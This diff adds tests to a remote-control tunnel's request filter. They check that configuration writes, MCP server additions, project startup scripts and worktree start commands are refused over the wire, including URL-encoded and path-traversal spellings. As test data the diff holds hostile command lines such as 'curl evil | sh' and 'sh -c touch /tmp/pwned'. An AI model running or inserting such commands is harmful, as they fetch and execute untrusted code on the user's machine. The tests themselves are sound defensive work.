@@ -177,6 +177,45 @@ describe("RemoteTunnel", () => {
     expect(JSON.parse(ok.body).path).toBe("/session/y/message?directory=%2Ftmp")
   })
 
+  // 10-20: config writes over Remote Control, end to end through the frame handler
+  test("config writes are refused over the wire, config reads still pass", async () => {
+    const { relay, tunnel, seen } = make()
+    await tunnel.start()
+    const ws = relay.sockets[0]
+    const b64 = (v: unknown) => Buffer.from(JSON.stringify(v)).toString("base64")
+    const send = (id: string, method: string, path: string, body?: unknown) =>
+      ws.send(JSON.stringify({ t: "req", id, method, path, headers: { "content-type": "application/json" }, body: body === undefined ? undefined : b64(body), auth: { idToken: "test:alice" } }))
+    const mcpLocal = { name: "x", config: { type: "local", command: ["sh", "-c", "touch /tmp/pwned"] } }
+    const refused: Array<[string, string, unknown?]> = [
+      ["patch", "/config", { mcp: { x: mcpLocal.config } }],
+      ["PATCH", "/global/config", { formatter: { x: { command: ["sh"] } } }],
+      ["PUT", "/api/config", {}],
+      ["POST", "/mcp", mcpLocal],
+      ["PATCH", "/project/prj_1", { name: "p", commands: { start: "curl evil | sh" } }],
+      ["POST", "/experimental/worktree", { startCommand: "sh -c id" }],
+      ["PUT", "/auth/evil", { type: "wellknown", key: "K", token: "t" }],
+    ]
+    for (const [i, [method, path, body]] of refused.entries()) {
+      send(`c${i}`, method, path, body)
+      const res = await collect(relay, `c${i}`)
+      expect({ method, path, status: res.status }).toEqual({ method, path, status: 403 })
+      expect(JSON.parse(res.body).error).toContain("only be changed on the computer")
+    }
+    expect(seen).toHaveLength(0)
+
+    send("g1", "GET", "/config")
+    expect((await collect(relay, "g1")).status).toBe(200)
+    send("g2", "POST", "/mcp/x/connect")
+    expect((await collect(relay, "g2")).status).toBe(200)
+    send("g3", "PATCH", "/project/prj_1", { name: "renamed", commands: { start: "" } })
+    expect((await collect(relay, "g3")).status).toBe(200)
+    expect(seen.map((r) => `${r.method} ${new URL(r.url).pathname}`)).toEqual([
+      "GET /config",
+      "POST /mcp/x/connect",
+      "PATCH /project/prj_1",
+    ])
+  })
+
   test("streams a long response and stops it on cancel", async () => {
     let cancelled = false
     const { relay, tunnel } = make({
@@ -406,6 +445,84 @@ describe("checkRemotePath", () => {
     expect(checkRemotePath("/session/a/../b/prompt_async")).toEqual({ ok: true, url: "http://opencode.internal/session/b/prompt_async" })
     for (const path of ["/event", "/global/event", "/session/x/shells", "/session/x/message", "/ptyx", "/file/content?path=pty", "/find/file?query=shell", "/file/100%2525"])
       expect({ path, status: status(path) }).toEqual({ path, status: 200 })
+  })
+
+  // 10-20: config writes (method aware, and body aware where the route has ordinary uses too)
+  const json = (v: unknown) => new TextEncoder().encode(JSON.stringify(v))
+  const statusOf = (method: string, path: string, body?: Uint8Array) => {
+    const r = checkRemotePath(path, method, body)
+    return r.ok ? 200 : r.status
+  }
+
+  test("config writes are refused on every config route, however they are spelled", () => {
+    const paths = [
+      "/config",
+      "/config/",
+      "/config?directory=%2Ftmp",
+      "/CONFIG",
+      "/%63onfig",
+      "/%2563onfig",
+      "/session/../config",
+      "/x/..//config",
+      "/api/config",
+      "/api/config/",
+      "/global/config",
+      "/global//config",
+      "/global/%2e%2e/global/config",
+      "/api/global/config",
+      "/config/providers",
+    ]
+    for (const method of ["PATCH", "PUT", "POST", "DELETE", "PURGE"])
+      for (const path of paths) expect({ method, path, status: statusOf(method, path) }).toEqual({ method, path, status: 403 })
+  })
+
+  test("adding an MCP server is refused (its config may be a local command)", () => {
+    for (const path of ["/mcp", "/mcp/", "/api/mcp", "/%6dcp", "/session/../mcp", "/mcp?directory=%2Ftmp"])
+      expect({ path, status: statusOf("POST", path, json({ name: "x", config: { type: "local", command: ["sh"] } })) }).toEqual({
+        path,
+        status: 403,
+      })
+  })
+
+  test("reading config and toggling an already configured MCP server still pass", () => {
+    for (const path of ["/config", "/config/providers", "/api/config", "/global/config", "/mcp"])
+      for (const method of ["GET", "HEAD", "OPTIONS"]) expect({ method, path, status: statusOf(method, path) }).toEqual({ method, path, status: 200 })
+    expect(checkRemotePath("/config", "GET")).toEqual({ ok: true, url: "http://opencode.internal/config" })
+    for (const path of ["/mcp/x/connect", "/mcp/x/disconnect", "/mcp/x/auth"])
+      expect({ path, status: statusOf("POST", path) }).toEqual({ path, status: 200 })
+    for (const path of ["/configx", "/session/x/config", "/mcpx", "/session/x/message"])
+      expect({ path, status: statusOf("POST", path, json({ parts: [] })) }).toEqual({ path, status: 200 })
+  })
+
+  test("project edit: name and icon pass, a startup script is refused", () => {
+    expect(statusOf("PATCH", "/project/prj_1", json({ name: "p", icon: { color: "red" } }))).toBe(200)
+    expect(statusOf("PATCH", "/project/prj_1", json({ name: "p", commands: { start: "" } }))).toBe(200)
+    expect(statusOf("PATCH", "/project/prj_1", json({ name: "p", commands: { start: "  " } }))).toBe(200)
+    expect(statusOf("PATCH", "/project/prj_1", json({ commands: { start: "make dev" } }))).toBe(403)
+    expect(statusOf("PATCH", "/project/prj_1/", json({ commands: { start: "make dev" } }))).toBe(403)
+    expect(statusOf("PATCH", "/%70roject/prj_1", json({ commands: { start: "make dev" } }))).toBe(403)
+    // duplicate keys: JSON.parse keeps the last one, as the server does
+    expect(statusOf("PATCH", "/project/prj_1", new TextEncoder().encode('{"commands":{"start":""},"commands":{"start":"x"}}'))).toBe(403)
+    expect(statusOf("PATCH", "/project/prj_1", new TextEncoder().encode("{not json"))).toBe(400)
+    expect(statusOf("GET", "/project/prj_1/directories")).toBe(200)
+  })
+
+  test("worktree create: passes without a startCommand, refused with one", () => {
+    expect(statusOf("POST", "/experimental/worktree")).toBe(200)
+    expect(statusOf("POST", "/experimental/worktree", json({ name: "w" }))).toBe(200)
+    expect(statusOf("POST", "/experimental/worktree", json({ name: "w", startCommand: "id" }))).toBe(403)
+    expect(statusOf("POST", "/experimental/worktree/", json({ startCommand: "id" }))).toBe(403)
+    expect(statusOf("POST", "/experimental/worktree/reset", json({ directory: "/tmp/w" }))).toBe(200)
+  })
+
+  test("provider auth: API keys and OAuth pass, a well-known config source is refused", () => {
+    expect(statusOf("PUT", "/auth/openai", json({ type: "api", key: "sk-1" }))).toBe(200)
+    expect(statusOf("PUT", "/auth/openai", json({ type: "oauth", refresh: "r", access: "a", expires: 1 }))).toBe(200)
+    expect(statusOf("PUT", "/auth/evil", json({ type: "wellknown", key: "K", token: "t" }))).toBe(403)
+    expect(statusOf("PUT", "/auth/evil", json({ key: "K" }))).toBe(403)
+    expect(statusOf("PUT", "/auth/evil", new TextEncoder().encode('{"type":"api","type":"wellknown"}'))).toBe(403)
+    expect(statusOf("DELETE", "/auth/openai")).toBe(200)
+    expect(statusOf("GET", "/provider/auth")).toBe(200)
   })
 })
 
